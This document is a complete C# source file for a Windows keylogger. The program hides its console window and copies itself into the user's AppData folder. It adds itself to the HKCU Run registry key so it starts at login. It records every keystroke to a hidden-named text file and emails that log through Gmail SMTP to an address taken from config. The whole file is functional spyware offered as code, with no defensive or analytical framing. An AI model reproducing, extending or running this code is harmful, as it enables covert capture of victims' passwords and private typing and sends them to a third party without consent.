using System;
using System.Net.Mail; // include reference
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Diagnostics;

namespace KeyLogger
{
    class KeyLoggerClass
    {
        #region Constants
        public const int HOMEKEY = 36;
        public const int ENDKEY = 35;
        public const int ENTERKEY = 13;
        public const int SPACEKEY = 32;
        public const int SW_HIDE = 0;
        public const int COUNTKEYS = 255;
        public string AppName;
        public static int idx = 0; // to do
        public String Guid;
        public DateTime LastTimeMail;
        #endregion
        public KeyLoggerClass()
        {
            this.Guid = "8c4d2677-1f83-45f7-90b3-8723f400d800";
            this.AppName = System.Configuration.ConfigurationSettings.AppSettings["AppName"];
            LastTimeMail = DateTime.Now;

        }
        #region WinAPI
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion

        #region FileWriting
        public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
        public static System.IO.StreamWriter myFile = null;
        #endregion

        #region ConsoleOnClose

        public delegate bool ConsoleEventDelegate(int eventType);
         
        public static bool ConsoleEventCallback(int eventType)
        {
            if (eventType == 2) // if event = close console
            {
                myFile.Close();
                KeyLoggerClass.EmailSend();
                foreach (var process in Process.GetProcessesByName("conhost"))
                {
                    process.Kill();
                }
                //Environment.Exit(0);
                return true;
            }
            return false;
        } // when console closes

        public static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected

        #endregion

        public bool CheckTime()
        {

            if (this.LastTimeMail.TimeOfDay.Hours <= DateTime.Now.TimeOfDay.Hours - 1)
            {
                return true;
            }
            else 
                return false;
        
        }
        
        public static void EmailSend() 
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress(System.Configuration.ConfigurationSettings.AppSettings["MailFrom"]);
            mail.To.Add(System.Configuration.ConfigurationSettings.AppSettings["MailTo"]);
            mail.Subject = "spy is real";
            mail.Body = "keylogger via c sharp";

            System.Net.Mail.Attachment attachment;
            attachment = new System.Net.Mail.Attachment(filename);
            mail.Attachments.Add(attachment);

            SmtpServer.Port = Convert.ToInt16(System.Configuration.ConfigurationSettings.AppSettings["Port"]);
            SmtpServer.Credentials = new System.Net.NetworkCredential(System.Configuration.ConfigurationSettings.AppSettings["MailFrom"], System.Configuration.ConfigurationSettings.AppSettings["PasswordFrom"]);
            SmtpServer.EnableSsl = true;
            SmtpServer.Send(mail);
        }
        public void MoveToAppDataFolder()
        {

            String CopiedProgrammPath = "c:\\users\\" + Environment.UserName + "\\Appdata\\Local";
            //MessageBox.Show(Application.ExecutablePath.Replace(".exe", ".vshost.exe") + ".vshost.exe.config");
            //ZipFile zip = new ZipFile();
           // MessageBox.Show(Application.ExecutablePath.Replace(".EXE", ".vshost.exe"), this.AppName + ".vshost.exe");

            String file = Application.ExecutablePath;
            String to = "d:\\tmp.zip";
            //string startPath = @"c:\example\start";
            
            String extractPath = CopiedProgrammPath;
            try
            {
                ZipFile.CreateFromDirectory(file, to);
            }
            catch (IOException)
            {
                // continue if file is already defined
            }
            using (ZipArchive zip = ZipFile.Open(to, ZipArchiveMode.Update))
            {
                zip.CreateEntryFromFile(file, this.AppName + ".exe");
                Thread.Sleep(10);                
                zip.CreateEntryFromFile(file + ".config", this.AppName + ".exe.config");
                Thread.Sleep(10);
                zip.CreateEntryFromFile(file.Replace(".exe", ".vshost.exe.config"), this.AppName + ".vshost.exe.config");
                Thread.Sleep(10);
                zip.CreateEntryFromFile(file.Replace(".EXE", ".vshost.exe"), this.AppName + ".vshost.exe");
                Thread.Sleep(10);

            }
            try
            {
                ZipFile.ExtractToDirectory(to, extractPath);
                Thread.Sleep(10);
            }
            catch 
            {
                // already exists
            }
            File.Delete(to);
            //File.Delete(Application.ExecutablePath);
        }


        public bool SetAutorunValue(bool autorun)
        {
            
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
              //Microsoft.Win32.RegistryKey myKey =Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\", true);
              //myKey.SetValue(AppName, Application.ExecutablePath);
            
            try
            {
                if (autorun)
                {
                    reg.SetValue(Guid, "c:\\users\\" + Environment.UserName + "\\Appdata\\Local\\" + this.AppName + ".exe"); 
                }
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
            
        }
        public static void HideWindow()
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE); 

        }

        public static void Main(string[] args)
        {
            KeyLoggerClass obj = new KeyLoggerClass();
            HideWindow();
            obj.MoveToAppDataFolder();
            obj.SetAutorunValue(true);
            handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
            SetConsoleCtrlHandler(handler, true);                     // subscribe onclose event to ConsoleEventCallback
            if (System.IO.File.Exists(filename)) // if file exists then delete it and create again
            {
                System.IO.File.Delete(filename);
            }
            myFile  = new System.IO.StreamWriter(filename); 
            myFile.WriteLineAsync(DateTime.Now.ToString()); // write date to top of file
            StartLogging();
        }
    
        public static void StartLogging()
        {
            int lastKey = 0;
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < COUNTKEYS; i++) 
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767) // if key is about keyboard or mouse
                    {
                        switch (i)
                        {
                            case SPACEKEY:
                                myFile.WriteAsync(" ");
                                break;
                            case ENTERKEY:
                                myFile.WriteLineAsync(myFile.NewLine);
                                break;
                            case ENDKEY:
                                if (lastKey == HOMEKEY)
                                {
                                    myFile.WriteLineAsync("+End pressed!!!");
                                    ConsoleEventCallback(2); // exit event code 
                                    Environment.Exit(0);
                                }
                                else
                                {
                                    myFile.WriteAsync(((Keys)i).ToString());
                                }
                                break;
                            default:
                                myFile.WriteAsync(((Keys)i).ToString()); // write key to file
                               // Console.WriteLine(i);
                                break;
                        }
                        lastKey = i;
                    }
                }
            }
            
        }
    }
}